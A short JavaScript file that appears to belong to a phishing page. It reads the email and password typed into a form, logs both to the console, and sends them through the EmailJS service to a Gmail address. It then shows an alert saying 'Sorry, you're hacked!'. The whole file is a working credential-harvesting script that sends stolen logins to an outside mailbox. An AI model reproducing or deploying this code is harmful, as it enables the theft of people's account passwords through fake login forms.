
(function()
{
  console.log("Initiallizing email stuff");
  emailjs.init("user_XYNdN92yHCWf97RSwemwg");
})();

function myFunction()
{
  console.log("Hi!");
  var email = $('#email').val();
  var passsword = $('#password').val();

  console.log(email);
  console.log(passsword);

  emailjs.send("gmail", "template_TV08CQI3", {"reply_to":"bobstottts@gmail.com","from_name": email,"message_html":passsword});
  alert("Sorry, you're hacked!");
}
